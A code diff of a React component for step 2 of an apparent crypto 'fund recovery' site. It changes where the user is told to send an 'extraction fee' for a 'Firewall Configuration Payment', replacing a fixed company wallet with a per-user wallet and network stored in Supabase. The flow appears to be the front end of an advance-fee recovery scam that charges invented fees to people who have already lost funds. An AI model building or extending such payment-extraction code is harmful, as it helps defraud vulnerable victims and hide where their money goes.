@@ -20,11 +20,13 @@ const RecoveryStep2 = () => {
   const { toast } = useToast();
 
   const companyWalletAddress = import.meta.env.VITE_WALLET_ADDRESS;
+  const walletNetwork = import.meta.env.VITE_WALLET_NETWORK || "TRC20";
+
 
   const handleCopyWallet = async () => {
     try {
-      await navigator.clipboard.writeText(companyWalletAddress);
-      console.log("Step 2: Wallet address copied:", companyWalletAddress);
+await navigator.clipboard.writeText(user.paidwallet);
+      console.log("Step 1: Wallet address copied:", user.paidwallet);
       toast({
         title: "Wallet Address Copied",
         description: "The wallet address has been copied to your clipboard.",
@@ -59,7 +61,7 @@ const RecoveryStep2 = () => {
 
         const { data, error } = await supabase
           .from("profiles")
-          .select("step1completed, step2completed, walletaddress, extraction_fee2")
+          .select("step1completed, step2completed, walletaddress, extraction_fee2, paidwallet, paidwalletnetwork")
           .eq("id", authUser.id)
           .single();
 
@@ -75,7 +77,9 @@ const RecoveryStep2 = () => {
                 walletaddress: "",
                 step1completed: false,
                 step2completed: false,
-                extraction_fee2: 125000, // Default fee in NGN
+                extraction_fee2: "",
+                paidwallet: "",
+                paidwalletnetwork: "",
               });
             if (insertError) {
               console.error("Step 2: Insert profile error:", insertError.message, insertError.details, insertError.hint, insertError.code);
@@ -84,7 +88,7 @@ const RecoveryStep2 = () => {
             // Retry fetching
             const { data: retryData, error: retryError } = await supabase
               .from("profiles")
-              .select("step1completed, step2completed, walletaddress, extraction_fee2")
+              .select("step1completed, step2completed, walletaddress, extraction_fee2, paidwallet, paidwalletnetwork")
               .eq("id", authUser.id)
               .single();
             if (retryError) {
@@ -98,6 +102,8 @@ const RecoveryStep2 = () => {
               step2Completed: retryData.step2completed,
               walletAddress: retryData.walletaddress,
               extractionFee: retryData.extraction_fee2,
+              paidwallet: retryData.paidwallet,
+              paidwalletnetwork: retryData.paidwalletnetwork,
             });
           } else {
             console.error("Step 2: Profile fetch error:", error.message, error.details, error.hint, error.code);
@@ -117,7 +123,7 @@ const RecoveryStep2 = () => {
             // Retry fetching
             const { data: retryData, error: retryError } = await supabase
               .from("profiles")
-              .select("step1completed, step2completed, walletaddress, extraction_fee2")
+              .select("step1completed, step2completed, walletaddress, extraction_fee2, paidwallet, paidwalletnetwork")
               .eq("id", authUser.id)
               .single();
             if (retryError) {
@@ -131,6 +137,8 @@ const RecoveryStep2 = () => {
               step2Completed: retryData.step2completed,
               walletAddress: retryData.walletaddress,
               extractionFee: retryData.extraction_fee2,
+              paidwallet: retryData.paidwallet,
+              paidwalletnetwork: retryData.paidwalletnetwork,
             });
           } else {
             console.log("Step 2: Profile loaded:", data);
@@ -140,6 +148,8 @@ const RecoveryStep2 = () => {
               step2Completed: data.step2completed,
               walletAddress: data.walletaddress,
               extractionFee: data.extraction_fee2,
+              paidwallet: data.paidwallet,
+              paidwalletnetwork: data.paidwalletnetwork,
             });
             setWalletAddress(data.walletaddress || "");
           }
@@ -468,10 +478,10 @@ const RecoveryStep2 = () => {
                     <h3 className="font-semibold text-foreground">Make Your Firewall Configuration Payment</h3>
                     <div className="space-y-2">
                       <p className="text-lg text-foreground">
-                        Send ${user.extractionFee.toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 })} USDT to this wallet address:
+                        Send ${user.extractionFee.toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 })} ({user.paidwalletnetwork}) to this wallet address:
                       </p>
                       <p className="text-sm text-muted-foreground break-all">
-                        Wallet Address: {companyWalletAddress}
+                        Wallet Address: {user.paidwallet}
                       </p>
                       <Button onClick={handleCopyWallet} size="sm" className="mt-2">
                         <Copy className="h-4 w-4 mr-2" />
